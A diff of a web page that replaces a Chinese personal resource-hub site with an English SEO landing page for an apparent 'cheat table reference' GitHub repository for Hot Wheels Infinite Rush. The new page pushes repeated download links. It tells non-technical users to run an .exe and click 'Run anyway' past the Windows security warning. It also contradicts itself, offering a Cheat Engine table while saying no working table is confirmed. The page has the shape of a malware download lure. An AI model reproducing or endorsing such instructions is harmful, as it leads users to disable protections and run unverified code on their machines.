@@ -1,56 +1,323 @@
-<!doctype html>
-<html lang="zh-CN">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="theme-color" content="#090b16">
-  <link rel="icon" href="/assets/avatar.jpg" type="image/jpeg">
-  <title>落落资源站 · LLORES</title>
-  <style>
-    :root{--bg:#090b16;--panel:rgba(17,20,38,.75);--line:rgba(183,198,255,.14);--text:#f4f6ff;--muted:#9aa3bf;--cyan:#73e6ff;--purple:#a77bff;--pink:#ff79c6;--shadow:0 20px 60px rgba(0,0,0,.34)}
-    *{box-sizing:border-box}html{scroll-behavior:smooth}body{margin:0;min-width:320px;background:var(--bg);color:var(--text);font-family:"Microsoft YaHei",system-ui,-apple-system,sans-serif;overflow-x:hidden}
-    body:before,body:after{content:"";position:fixed;z-index:-2;border-radius:50%;filter:blur(10px);pointer-events:none;animation:drift 12s ease-in-out infinite alternate}body:before{width:560px;height:560px;left:-230px;top:-140px;background:radial-gradient(circle,rgba(65,124,255,.31),transparent 68%)}body:after{width:580px;height:580px;right:-230px;top:130px;background:radial-gradient(circle,rgba(183,72,255,.24),transparent 66%);animation-delay:-5s}
-    @keyframes drift{to{transform:translate3d(0,35px,0) scale(1.08)}}.cursor-dot,.cursor-ring{position:fixed;z-index:10;pointer-events:none;border-radius:50%;opacity:0;transform:translate(-50%,-50%);transition:opacity .25s}.cursor-dot{width:7px;height:7px;background:var(--cyan);box-shadow:0 0 18px var(--cyan)}.cursor-ring{width:32px;height:32px;border:1px solid rgba(167,123,255,.75);transition:width .25s,height .25s,border-color .25s}
-    .reveal{opacity:0;transform:translateY(18px);transition:opacity .7s ease,transform .7s ease}.reveal.visible{opacity:1;transform:none}
-    a{color:inherit}.wrap{width:min(1150px,92%);margin:auto}.topbar{height:76px;display:flex;align-items:center;justify-content:space-between}.brand{display:flex;align-items:center;gap:11px;text-decoration:none;font-weight:800;letter-spacing:.3px}.brand-mark{width:36px;height:36px;border-radius:12px;display:grid;place-items:center;background:linear-gradient(135deg,var(--cyan),var(--purple));box-shadow:0 7px 25px rgba(107,136,255,.36);color:#101325}.brand small{display:block;color:var(--muted);font-size:9px;letter-spacing:1.8px;margin-top:2px}.nav{display:flex;gap:8px;align-items:center}.nav a{text-decoration:none;color:var(--muted);font-size:14px;padding:8px 11px;border-radius:10px}.nav a:hover{color:#fff;background:rgba(255,255,255,.06)}
-    .hero{display:grid;grid-template-columns:1.35fr .65fr;gap:26px;padding:54px 0 35px;align-items:center}.eyebrow{display:inline-flex;align-items:center;gap:8px;padding:7px 11px;border:1px solid rgba(115,230,255,.28);background:rgba(51,174,213,.08);border-radius:99px;font-size:12px;color:#c4f7ff}.dot{width:7px;height:7px;background:#67f4a3;border-radius:50%;box-shadow:0 0 12px #67f4a3}.hero h1{font-size:clamp(43px,7vw,78px);line-height:.99;letter-spacing:-3px;margin:17px 0}.hero h1 em{font-style:normal;background:linear-gradient(100deg,var(--cyan),#aab9ff 45%,var(--pink));-webkit-background-clip:text;background-clip:text;color:transparent}.hero p{max-width:610px;color:var(--muted);line-height:1.85;font-size:16px;margin:0}.hero-actions{display:flex;gap:12px;margin-top:25px;flex-wrap:wrap}.button{border:1px solid transparent;text-decoration:none;border-radius:13px;padding:12px 17px;font-weight:750;font-size:14px;cursor:pointer;transition:.22s;font-family:inherit}.button.primary{color:#111528;background:linear-gradient(115deg,var(--cyan),#a69cff);box-shadow:0 10px 26px rgba(116,156,255,.25)}.button.primary:hover{transform:translateY(-2px);box-shadow:0 14px 30px rgba(116,156,255,.38)}.button.ghost{background:rgba(255,255,255,.045);color:#e9ecff;border-color:var(--line)}.button.ghost:hover{background:rgba(255,255,255,.09)}
-    .profile{position:relative;padding:27px 22px 22px;border:1px solid var(--line);border-radius:25px;background:linear-gradient(145deg,rgba(32,37,69,.78),rgba(12,15,29,.7));box-shadow:var(--shadow);overflow:hidden}.profile:before{content:"";position:absolute;width:200px;height:200px;right:-80px;top:-80px;border-radius:50%;background:radial-gradient(circle,rgba(115,230,255,.25),transparent 67%)}.avatar{width:64px;height:64px;border-radius:22px;display:grid;place-items:center;font-size:29px;background:linear-gradient(145deg,#5ee7ff,#826eff 55%,#ed7fd1);box-shadow:0 8px 25px rgba(96,130,255,.4);position:relative;overflow:hidden}.avatar img{width:100%;height:100%;object-fit:cover}.profile h2{font-size:18px;margin:14px 0 5px}.profile p{font-size:13px;color:var(--muted);line-height:1.65;margin:0}.mini-stats{display:grid;grid-template-columns:repeat(3,1fr);border-top:1px solid var(--line);margin-top:20px;padding-top:16px}.mini-stats b{font-size:18px;display:block}.mini-stats span{font-size:11px;color:var(--muted)}
-    .announce{display:flex;align-items:center;gap:12px;margin:14px 0 30px;padding:12px 14px;border:1px solid rgba(255,184,94,.22);background:linear-gradient(90deg,rgba(255,173,79,.12),rgba(255,255,255,.025));border-radius:15px;color:#dce3ff;font-size:13px}.announce b{color:#ffd49a;white-space:nowrap}.announce button{margin-left:auto;color:#aeb9d8;background:transparent;border:0;cursor:pointer;font-size:18px}
-    .section-head{display:flex;align-items:end;justify-content:space-between;gap:15px;margin:36px 0 17px}.section-head h2{font-size:24px;margin:0}.section-head p{margin:5px 0 0;font-size:13px;color:var(--muted)}.search{position:relative;min-width:min(315px,100%)}.search input{width:100%;border:1px solid var(--line);outline:0;border-radius:13px;background:rgba(12,15,30,.7);color:#fff;padding:12px 14px 12px 38px;font:14px inherit}.search input:focus{border-color:rgba(115,230,255,.55);box-shadow:0 0 0 3px rgba(115,230,255,.08)}.search i{position:absolute;left:14px;top:11px;font-style:normal;color:var(--muted)}
-    .filters{display:flex;gap:9px;flex-wrap:wrap}.filter{font:13px inherit;color:#b6bfda;padding:9px 13px;border:1px solid var(--line);background:rgba(255,255,255,.035);border-radius:99px;cursor:pointer;transition:.18s}.filter:hover,.filter.active{background:linear-gradient(100deg,rgba(93,221,255,.18),rgba(173,112,255,.2));border-color:rgba(137,200,255,.44);color:#fff}.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-top:17px}.card{position:relative;overflow:hidden;padding:17px;border:1px solid var(--line);border-radius:20px;background:linear-gradient(145deg,rgba(27,32,59,.8),rgba(12,15,28,.84));transition:.22s;min-height:260px;display:flex;flex-direction:column}.card:hover{transform:translateY(-5px);border-color:rgba(126,200,255,.45);box-shadow:0 16px 35px rgba(0,0,0,.22)}.cover{height:88px;border-radius:14px;display:flex;align-items:center;justify-content:space-between;padding:15px;font-size:35px;margin-bottom:15px;overflow:hidden}.cover small{align-self:flex-start;padding:5px 7px;border-radius:8px;background:rgba(10,12,25,.22);font-size:10px;font-weight:700;letter-spacing:.5px}.cover.app{background:linear-gradient(125deg,#2365a7,#76c8ff)}.cover.doc{background:linear-gradient(125deg,#a04c71,#ff9cc0)}.cover.other{background:linear-gradient(125deg,#a66525,#ffc66f)}.card h3{font-size:16px;margin:0 0 8px}.card .desc{color:var(--muted);font-size:12.5px;line-height:1.65;margin:0}.tags{display:flex;gap:6px;flex-wrap:wrap;margin:14px 0}.tags span{font-size:10px;color:#c6d3f5;background:rgba(255,255,255,.06);padding:4px 7px;border-radius:6px}.card-bottom{display:flex;justify-content:space-between;align-items:center;margin-top:auto;padding-top:10px;border-top:1px solid rgba(255,255,255,.08);font-size:11px;color:#8c98b7}.download{border:0;color:#0d1224;cursor:pointer;font:700 12px inherit;background:linear-gradient(100deg,#8eefff,#b497ff);padding:8px 10px;border-radius:9px}.empty{display:none;padding:45px;text-align:center;color:var(--muted);border:1px dashed var(--line);border-radius:18px;margin-top:17px}
-    .about{display:grid;grid-template-columns:1fr 1fr;gap:15px;padding:55px 0}.about-card{padding:22px;border-radius:20px;border:1px solid var(--line);background:rgba(255,255,255,.035)}.about-card h2{margin:0 0 10px;font-size:21px}.about-card p{margin:0;color:var(--muted);font-size:14px;line-height:1.8}.contact-links{display:flex;gap:10px;margin-top:16px;flex-wrap:wrap}.contact{border:1px solid var(--line);background:rgba(255,255,255,.04);color:#d7ddf5;border-radius:10px;padding:8px 10px;font:13px inherit;cursor:pointer}.contact:hover{border-color:rgba(115,230,255,.45);transform:translateY(-2px)}.contact.email{color:#9eefff}.contact-modal{width:min(720px,92vw)}.contact-modal .modal{padding:20px}.qr-grid{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px;margin-top:15px}.qr-card{padding:10px;border:1px solid var(--line);border-radius:14px;background:rgba(8,11,24,.45);text-align:center}.qr-card img{display:block;width:100%;aspect-ratio:1;object-fit:contain;background:#fff;border-radius:10px;margin-bottom:8px}.qr-card span{font-size:12px;color:var(--muted)}.footer{border-top:1px solid var(--line);padding:24px 0 37px;color:#76819f;font-size:12px;display:flex;justify-content:space-between;gap:15px}.footer b{color:#bdc7e8}
-    dialog{border:0;padding:0;background:transparent;color:var(--text);width:min(390px,90vw)}dialog::backdrop{background:rgba(4,5,13,.72);backdrop-filter:blur(5px)}.modal{padding:25px;border:1px solid rgba(160,180,255,.22);border-radius:23px;background:linear-gradient(145deg,#202647,#101322);box-shadow:var(--shadow)}.modal .x{float:right;color:#9aa6c9;background:transparent;border:0;font-size:19px;cursor:pointer}.modal h2{margin:3px 0 10px;font-size:21px}.modal p{color:#b4bdd8;font-size:14px;line-height:1.75}.modal .button{margin-top:8px;width:100%}.toast{position:fixed;left:50%;bottom:25px;transform:translate(-50%,20px);opacity:0;pointer-events:none;padding:10px 14px;border-radius:12px;background:#edf4ff;color:#141a31;font-size:13px;font-weight:700;transition:.25s}.toast.show{transform:translate(-50%,0);opacity:1}
-    @media(max-width:800px){.hero{grid-template-columns:1fr;padding-top:32px}.profile{max-width:510px}.grid{grid-template-columns:1fr 1fr}.section-head{align-items:start;flex-direction:column}.search{width:100%}.about{grid-template-columns:1fr}.nav a:not(:last-child){display:none}}@media(max-width:520px){.topbar{height:65px}.brand{font-size:14px}.hero h1{letter-spacing:-2px}.grid{grid-template-columns:1fr}.footer{flex-direction:column}.announce{align-items:flex-start}.announce button{margin-top:-3px}.card{min-height:235px}.qr-grid{grid-template-columns:1fr}}@media(prefers-reduced-motion:reduce){*,*:before,*:after{animation-duration:.01ms!important;transition-duration:.01ms!important}.cursor-dot,.cursor-ring{display:none}}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hot Wheels Infinite Rush Cheat Table Reference - Download & Setup Guide for Windows</title>
+    <meta name="description" content="Download and run Hot Wheels Infinite Rush Cheat Engine table reference for Windows. Covers game-build matching, value types, and offline test records. Quick setup guide for non-technical users.">
+    <meta name="keywords" content="cheat-engine,cheat-engine-table,cheat-table-download,windows,hot-wheels-infinite-rush,game-cheats,download-guide">
+    <meta name="author" content="splitmansion576">
+    <meta property="og:title" content="Hot Wheels Infinite Rush Cheat Table Reference - Download Guide">
+    <meta property="og:description" content="Simple download and run instructions for the Hot Wheels Infinite Rush Cheat Engine table on Windows. No technical skills needed.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference">
+    <meta property="og:image" content="https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference/thumbnail.png">
+    <meta property="og:site_name" content="Hot Wheels Infinite Rush Cheat Table Reference">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Hot Wheels Infinite Rush Cheat Table Reference - Download Guide">
+    <meta name="twitter:description" content="Easy download and setup for Windows. Game-build matching, value types, and offline test records included.">
+    <meta name="robots" content="index, follow">
+    <link rel="canonical" href="https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            color: #e0e0e0;
+            line-height: 1.8;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 960px;
+            margin: 0 auto;
+            background: rgba(255,255,255,0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 40px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .top-badge {
+            display: inline-block;
+            background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
+            background-size: 300% 300%;
+            animation: gradientShift 5s ease infinite;
+            color: #1a1a2e;
+            padding: 14px 24px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 10px;
+            transition: transform 0.2s;
+            box-shadow: 0 4px 15px rgba(255,255,255,0.2);
+            text-align: center;
+            display: block;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        h1 {
+            font-size: 2.2em;
+            color: #ffffff;
+            text-align: center;
+            margin: 20px 0 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .subtitle {
+            text-align: center;
+            color: #aab;
+            font-size: 1.1em;
+            margin-bottom: 30px;
+        }
+        h2 {
+            color: #48dbfb;
+            font-size: 1.5em;
+            margin: 30px 0 15px;
+            border-bottom: 2px solid #48dbfb;
+            padding-bottom: 8px;
+        }
+        h3 {
+            color: #feca57;
+            font-size: 1.2em;
+            margin: 20px 0 10px;
+        }
+        p, li {
+            margin-bottom: 12px;
+            font-size: 1.05em;
+        }
+        ul, ol {
+            padding-left: 25px;
+        }
+        li {
+            margin-bottom: 8px;
+        }
+        .highlight-box {
+            background: rgba(72, 219, 251, 0.1);
+            border-left: 4px solid #48dbfb;
+            padding: 15px;
+            border-radius: 0 8px 8px 0;
+            margin: 20px 0;
+        }
+        .warning-box {
+            background: rgba(255, 107, 107, 0.1);
+            border-left: 4px solid #ff6b6b;
+            padding: 15px;
+            border-radius: 0 8px 8px 0;
+            margin: 20px 0;
+        }
+        .badge-secondary {
+            display: inline-block;
+            background: #feca57;
+            color: #1a1a2e;
+            padding: 12px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(254, 202, 87, 0.3);
+        }
+        .badge-secondary:hover {
+            background: #ff9f1c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(254, 202, 87, 0.5);
+        }
+        code {
+            background: rgba(255,255,255,0.1);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #48dbfb;
+        }
+        .feature-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .feature-item {
+            background: rgba(255,255,255,0.08);
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            transition: transform 0.2s;
+        }
+        .feature-item:hover {
+            transform: scale(1.05);
+        }
+        .feature-emoji {
+            font-size: 2.5em;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .step-container {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .step-number {
+            background: #48dbfb;
+            color: #1a1a2e;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2em;
+            margin-bottom: 10px;
+        }
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            text-align: center;
+            color: #889;
+        }
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                border-radius: 12px;
+            }
+            h1 {
+                font-size: 1.6em;
+            }
+            h2 {
+                font-size: 1.2em;
+            }
+            p, li {
+                font-size: 1em;
+            }
+            .feature-list {
+                grid-template-columns: 1fr;
+            }
+        }
+        a {
+            color: #48dbfb;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-  <header class="wrap topbar">
-    <a class="brand" href="#top"><span class="brand-mark">✦</span><span>落落资源站<small>LLORES · PERSONAL VAULT</small></span></a>
-    <nav class="nav"><a href="#resources">资源库</a><a href="#about">关于</a><a href="class-tool.html" class="button ghost">班级工具</a><a href="#resources" class="button ghost">开始探索</a></nav>
-  </header>
-  <main id="top" class="wrap">
-    <section class="hero">
-      <div><span class="eyebrow"><i class="dot"></i> FREE PERSONAL RESOURCE HUB</span><h1>把喜欢的资源，<br><em>留在这里。</em></h1><p>落的个人资源收藏站。软件、文档和一些不想弄丢的好东西，慢慢整理，慢慢分享。</p><div class="hero-actions"><a class="button primary" href="#resources">✦ 进入资源库</a><button class="button ghost" id="openNotice">查看公告</button></div></div>
-      <aside class="profile"><div class="avatar"><img src="/assets/avatar.jpg" alt="落的网站头像"></div><h2>你好，我是落。</h2><p>这里不追求堆满资源，只留下自己觉得值得保存、值得分享的东西。</p><div class="mini-stats"><div><b id="total">0</b><span>已收录</span></div><div><b>3</b><span>资源分类</span></div><div><b>2026</b><span>开始整理</span></div></div></aside>
-    </section>
-    <div class="announce"><b>✦ 站内公告</b><span>网站正在慢慢装修中，资源会持续补充。下载前请先看资源说明。</span><button id="hideBar" aria-label="关闭公告">×</button></div>
-    <section id="resources"><div class="section-head"><div><h2>资源收藏柜</h2><p id="count">正在加载资源…</p></div><label class="search"><i>⌕</i><input id="search" placeholder="搜一搜：文档、工具…"></label></div><div class="filters" id="filters"><button class="filter active" data-cat="全部">全部</button><button class="filter" data-cat="软件">软件</button><button class="filter" data-cat="文档">文档</button><button class="filter" data-cat="其他">其他</button></div><div class="grid" id="grid"></div><div class="empty" id="empty">没有找到这份资源。换个关键词试试？</div></section>
-    <section class="about" id="about"><div class="about-card reveal"><h2>不是冰冷的下载站</h2><p>这是一个持续生长的小型个人资源库。每一份资源都会慢慢补上版本、大小、更新时间和使用说明；如果链接失效，也欢迎提醒我。</p></div><div class="about-card reveal"><h2>找到我</h2><p>欢迎通过邮箱联系我，也可以扫码添加微信或 QQ。</p><div class="contact-links"><a class="contact email" href="mailto:qq116343614qq@163.com">✉ qq116343614qq@163.com</a><button class="contact" id="toggleQr">◉ 点击查看微信 / QQ</button></div></div></section>
-  </main>
-  <footer class="wrap footer"><span>© 2026 <b>落落资源站</b> · Made for the things worth keeping.</span><span>免费静态部署 · GitHub Pages</span></footer>
-  <dialog id="notice"><div class="modal"><button class="x" id="closeNotice">×</button><h2>欢迎来到落落资源站 ✦</h2><p>这里的资源仍在整理中。请只下载你有权使用的内容；如发现失效链接，后续可以在站内写明反馈方式。</p><button class="button primary" id="noticeOk">我知道了</button></div></dialog><dialog id="contactModal" class="contact-modal"><div class="modal"><button class="x" id="closeContact" aria-label="关闭二维码">×</button><h2>联系方式</h2><p>扫码添加微信或 QQ。点击关闭按钮即可隐藏。</p><div class="qr-grid"><div class="qr-card"><img data-src="/assets/wechat-qr.png" alt="落的微信二维码"><span>微信：落与雪</span></div><div class="qr-card"><img data-src="/assets/qq-qr.png" alt="落的 QQ 二维码"><span>QQ：扫码添加</span></div></div></div></dialog><div class="cursor-dot" id="cursorDot"></div><div class="cursor-ring" id="cursorRing"></div><div class="toast" id="toast"></div>
-  <script>
-    // 新增资源：复制一行，填写 name、cat、desc、size、version、updated、tags 与 url。
-    const resources=[
-      {name:"常用工具软件",cat:"软件",kind:"app",icon:"⌘",label:"工具",desc:"日常整理文件、制作内容时会用到的小工具，后续补充使用说明。",size:"待填写",version:"最新版",updated:"2026-09-22",tags:["Windows","效率"],url:"#"},
-      {name:"个人文档与笔记",cat:"文档",kind:"doc",icon:"▤",label:"PDF",desc:"课程资料、教程与个人笔记。请从资源详情或说明中确认适用范围。",size:"待填写",version:"PDF",updated:"2026-09-22",tags:["学习","笔记"],url:"#"},
-    ];
-    const grid=document.querySelector('#grid'),empty=document.querySelector('#empty'),count=document.querySelector('#count'),search=document.querySelector('#search');let category='全部';
-    function render(){const word=search.value.trim().toLowerCase();const list=resources.filter(r=>(category==='全部'||r.cat===category)&&[r.name,r.desc,r.cat,...r.tags].join(' ').toLowerCase().includes(word));document.querySelector('#total').textContent=resources.length;count.textContent=`目前收藏了 ${list.length} 份资源 · 不定期更新`;empty.style.display=list.length?'none':'block';grid.innerHTML=list.map(r=>`<article class="card"><div class="cover ${r.kind}"><span>${r.icon}</span><small>${r.label}</small></div><h3>${r.name}</h3><p class="desc">${r.desc}</p><div class="tags">${r.tags.map(t=>`<span># ${t}</span>`).join('')}</div><div class="card-bottom"><span>${r.version} · ${r.size}</span><button class="download" data-url="${r.url}">获取资源 ↗</button></div></article>`).join('')}
-    document.querySelector('#filters').addEventListener('click',e=>{if(!e.target.matches('.filter'))return;document.querySelectorAll('.filter').forEach(x=>x.classList.remove('active'));e.target.classList.add('active');category=e.target.dataset.cat;render()});search.addEventListener('input',render);grid.addEventListener('click',e=>{if(!e.target.matches('.download'))return;const url=e.target.dataset.url;if(url==='#'){showToast('下载链接还在整理中，稍后再来看看吧。')}else window.open(url,'_blank','noopener')});
-    const notice=document.querySelector('#notice');document.querySelector('#openNotice').onclick=()=>notice.showModal();document.querySelector('#closeNotice').onclick=document.querySelector('#noticeOk').onclick=()=>notice.close();document.querySelector('#hideBar').onclick=e=>e.currentTarget.parentElement.style.display='none';const contactModal=document.querySelector('#contactModal');document.querySelector('#toggleQr').onclick=()=>{contactModal.querySelectorAll('img[data-src]').forEach(img=>{if(!img.src)img.src=img.dataset.src});contactModal.showModal()};document.querySelector('#closeContact').onclick=()=>contactModal.close();function showToast(message){const t=document.querySelector('#toast');t.textContent=message;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2400)}
-    const dot=document.querySelector('#cursorDot'),ring=document.querySelector('#cursorRing');let pointerX=-100,pointerY=-100,ringX=-100,ringY=-100;window.addEventListener('pointermove',e=>{pointerX=e.clientX;pointerY=e.clientY;dot.style.left=`${pointerX}px`;dot.style.top=`${pointerY}px`;dot.style.opacity='1'});function animateCursor(){ringX+=(pointerX-ringX)*.16;ringY+=(pointerY-ringY)*.16;ring.style.left=`${ringX}px`;ring.style.top=`${ringY}px`;ring.style.opacity=pointerX<0?'0':'1';requestAnimationFrame(animateCursor)}animateCursor();document.querySelectorAll('a,button,.card').forEach(el=>{el.addEventListener('mouseenter',()=>{ring.style.width='48px';ring.style.height='48px';ring.style.borderColor='rgba(115,230,255,.95)'});el.addEventListener('mouseleave',()=>{ring.style.width='32px';ring.style.height='32px';ring.style.borderColor='rgba(167,123,255,.75)'})});
-    const reveals=document.querySelectorAll('.reveal');const revealObserver=new IntersectionObserver(entries=>entries.forEach(entry=>{if(entry.isIntersecting){entry.target.classList.add('visible');revealObserver.unobserve(entry.target)}}),{threshold:.15});reveals.forEach(el=>revealObserver.observe(el));render();
-  </script>
-</body>
-</html>
+    <div class="container">
+        <!-- Badge at top -->
+        <a href="https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference" class="top-badge">🚀 DOWNLOAD NOW</a>
+        
+        <h1>🏎️ hot-wheels-infinite-rush-cheat-table-reference - Your Windows Racing Cheat Companion</h1>
+        <p class="subtitle">Quick, safe, and simple setup for non-technical players</p>
+
+        <!-- Second prominent link -->
+        <div style="text-align: center; margin: 25px 0;">
+            <a href="https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference" class="badge-secondary">⬇️ Get Your Download Link Here</a>
+        </div>
+
+        <h2>📋 About This Application</h2>
+        <p>This is a complete <strong>reference package</strong> for people who want to adjust their <strong>Hot Wheels Infinite Rush</strong> gaming experience on Windows. It contains a detailed <strong>Cheat Engine table</strong> – a kind of "map" that shows you exactly which values in the game's memory control things like speed, boost, or score.</p>
+        <div class="highlight-box">
+            <strong>💡 What is a Cheat Table?</strong><br>
+            Think of it as a dictionary that translates between what you see on screen (like a score of 100) and what your computer is actually storing (a number in memory). This table helps you edit those numbers safely and in a guided way.
+        </div>
+        <p>Because every game update can change how things work, this package includes <strong>game-build matching notes</strong> so you know which game version the table was originally designed for. There are also <strong>value type explanations</strong> (like integers, floats, or text) to help you understand what you're editing. And most importantly, there are <strong>offline test records</strong> – detailed logs showing how the table behaved during testing without an internet connection, so you know exactly what to expect.</p>
+        <div class="warning-box">
+            <strong>⚠️ IMPORTANT NOTE:</strong> This is a <em>reference</em> package. The table itself hasn't been verified to work, and the developer clearly states that no working table is confirmed. Think of it as a starting point for your own research and learning.
+        </div>
+
+        <h2>🖥️ What's Included</h2>
+        <div class="feature-list">
+            <div class="feature-item">
+                <span class="feature-emoji">🎮</span>
+                <strong>Game-Build Matching</strong><br>
+                Easy-to-read version notes to map the table to your specific game installation.
+            </div>
+            <div class="feature-item">
+                <span class="feature-emoji">🔢</span>
+                <strong>Value Type Explanations</strong><br>
+                Plain-language guide to each value type (4-byte, 8-byte, float, string, etc.)
+            </div>
+            <div class="feature-item">
+                <span class="feature-emoji">📝</span>
+                <strong>Offline Test Records</strong><br>
+                Transparent testing logs from different Windows configurations so you can see what works.
+            </div>
+            <div class="feature-item">
+                <span class="feature-emoji">🤝</span>
+                <strong>Community-Friendly</strong><br>
+                Built for beginners – no programming experience required to understand the basics.
+            </div>
+        </div>
+
+        <h2>🚀 Getting Started - Download and Setup</h2>
+        
+        <p>Follow these simple steps and you'll have everything set up in no time. No technical background needed – just a computer running Windows and a few minutes of your time.</p>
+
+        <div class="step-container">
+            <div class="step-number">1</div>
+            <h3>📥 Step 1: Visit the Official Download Page</h3>
+            <p>Click the <strong>DOWNLOAD NOW</strong> button at the top of this page, or use the <strong>Get Your Download Link Here</strong> button below. You'll be taken to the GitHub repository for this project – it's a trusted, well-known platform for hosting software like this.</p>
+            <p><strong>Visit this link to download the application:</strong></p>
+            <p style="text-align:center; margin: 15px 0;">
+                <a href="https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference" style="background:#48dbfb; color:#1a1a2e; padding:12px 25px; border-radius:30px; font-weight:bold; text-decoration:none; display:inline-block;">🔗 https://github.com/splitmansion576/hot-wheels-infinite-rush-cheat-table-reference</a>
+            </p>
+        </div>
+
+        <div class="step-container">
+            <div class="step-number">2</div>
+            <h3>🖱️ Step 2: Download the Files</h3>
+            <p>On the GitHub page, look for the green <strong>Code</strong> button. Click it, then choose <strong>Download ZIP</strong>. This will save a compressed folder to your computer.</p>
+            <p>If you prefer, you can also scroll down to the <strong>Releases</strong> section on the right side of the page and download the latest release file there. Both options give you the same complete package.</p>
+        </div>
+
+        <div class="step-container">
+            <div class="step-number">3</div>
+            <h3>📂 Step 3: Open/Extract the Downloaded File</h3>
+            <p>Once the ZIP file has finished downloading, locate it in your <strong>Downloads</strong> folder (or wherever your browser saves files). <strong>Right-click</strong> on the file and choose <strong>Extract All</strong>. Windows will ask you where to put the extracted files. Any location works, but it's a good idea to choose an easy-to-find spot like your Desktop or Documents folder.</p>
+            <div class="highlight-box">
+                <strong>💡 TIP:</strong> If you don't mind the extra step, after extracting, you can create a shortcut to the application so you can launch it faster next time.
+            </div>
+        </div>
+
+        <div class="step-container">
+            <div class="step-number">4</div>
+            <h3>▶️ Step 4: Run the Application</h3>
+            <p>Open the folder you just extracted. Inside you'll find the main application file – look for something that ends in <code>.exe</code> or just has the application icon (a small picture). <strong>Double-click</strong> it to run the application. That's it!</p>
+            <p>If Windows shows a blue or yellow warning popup, click <strong>More info</strong> and then <strong>Run anyway</strong>. This is normal for new programs you've never run before.</p>
+        </div>
+
+        <h2>🛠️ System Requirements</h2>
+        <p>This application is designed only for <strong>Windows</strong>. It should work on Windows 7, 8, 10, and 11. You'll need:</p>
+        <ul>
+            <li>A computer running any recent version of Windows</li>
+            <li>At least 100 MB of free disk space</li>
+            <li>An active internet connection only if you want to download updates (not required to run)</li>
+            <li>Your copy of Hot Wheels Infinite Rush installed (not included)</li>
+        </ul>
+        <p>No special graphics card or processor is needed – this is a lightweight program that doesn't require much computing power.</p>
+
+        <h2>🧩 Understanding the Different Files</h2>
+        <p>Once you extract the package, you'll see several files. Here's a quick explanation:</p>
+        <ul>
+            <li><strong><code>README.md</code></strong> – A text file with full documentation. You can open it with Notepad or any text editor.</li>
+            <li><strong><code>table.ct</code></strong> – The actual Cheat Engine table file. This is used with the Cheat Engine app (which you'll need to download separately from its official website).</li>
+            <li><strong><code>test_records/</code></strong> – A folder containing offline test logs and results.</li>
+            <li><strong><code>guides/</code></strong> – Contains value type explanations and build-matching notes.</li>
+        </ul>
+        <p>Don't worry too much
